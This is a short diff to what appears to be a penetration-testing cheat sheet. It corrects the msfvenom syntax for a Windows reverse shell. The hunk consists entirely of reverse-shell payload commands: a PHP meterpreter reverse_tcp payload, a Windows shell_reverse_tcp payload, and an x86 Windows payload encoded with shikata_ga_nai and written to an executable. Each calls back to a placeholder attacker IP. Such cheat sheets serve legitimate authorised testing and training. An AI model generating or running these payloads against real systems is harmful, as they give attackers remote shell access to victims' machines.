@@ -21,7 +21,7 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -f raw
 
 ### windows reverse shell
 ```
-msfvenom -p windows/shell_reverse_tcp -LHOST=<attacker_ip> -LPORT=4444
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<local_ip> LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o v.exe
 ```
 
